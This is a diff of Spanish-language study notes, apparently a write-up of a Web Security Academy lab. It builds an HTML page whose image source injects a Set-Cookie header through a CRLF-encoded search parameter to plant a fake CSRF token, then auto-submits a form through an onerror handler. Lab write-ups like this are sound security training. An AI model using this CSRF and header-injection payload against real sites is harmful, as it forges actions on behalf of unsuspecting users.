@@ -38,7 +38,7 @@ ahora lo que tenemos que hacer es ir a la solicitud que contiene nuestra funció
 primero vamos e eliminar la función de las etiquetas `<script>` para poder hacer uso de nuestra inyección 
 ![[Pasted image 20250710164700.png]]
 
-ahora solo nos queda inyectar una fuente de imagen que haga un llamado a la url que sera 
+ahora solo nos queda inyectar una fuente de imagen que haga un llamado a la url que será la web + el encabezado que hemos construido. nos quedaría algo así: 
 
 ```python
 <html>
@@ -52,6 +52,11 @@ ahora solo nos queda inyectar una fuente de imagen que haga un llamado a la url 
     <img src="https://0aac003e046af89e81ef842e00ce003f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
   </body>
 </html>
+```
+
+donde
+```python
+<img src="https://0aac003e046af89e81ef842e00ce003f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
 ```
 
 ![[Pasted image 20250710165217.png]]
